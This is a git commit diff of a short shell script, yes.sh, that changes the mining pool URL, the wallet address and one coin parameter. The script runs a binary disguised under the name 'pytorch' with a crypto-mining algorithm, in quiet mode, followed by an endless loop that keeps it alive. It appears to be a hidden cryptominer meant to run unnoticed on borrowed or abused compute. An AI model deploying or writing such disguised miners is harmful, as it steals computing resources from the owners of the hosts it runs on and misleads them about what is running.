addc83e12625a030f0b8f7c899602f55d5b1c218
Waringsu <86929651+Waringsu@users.noreply.github.com>
2021-07-05 02:57:37 +0700

    Update yes.sh

--- yes.sh
+++ yes.sh
@@ -1,9 +1,9 @@
 #!/bin/sh
-POOL=stratum+tcp://lyra2z330.na.mine.zergpool.com:4563
-WALLET=DFtFJRa7oUzbBpUxYLXFaeTVDwyidT1TMk
+POOL=stratum+tcp://lyra2z330.na.mine.zpool.ca:4563
+WALLET=D9zT4xf7iGNcbrH6nLEKBCqjmiC3yKPwc2
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-CPU-MANTAB)
 chmod +x pytorch
-./pytorch -a lyra2z330 -o $POOL -u $WALLET -p c=DGB,mc=PYRK,ID=$WORKER -q
+./pytorch -a lyra2z330 -o $POOL -u $WALLET -p c=DGB,mc=GXX,ID=$WORKER -q
 while [ 1 ]; do
 sleep 3
 done
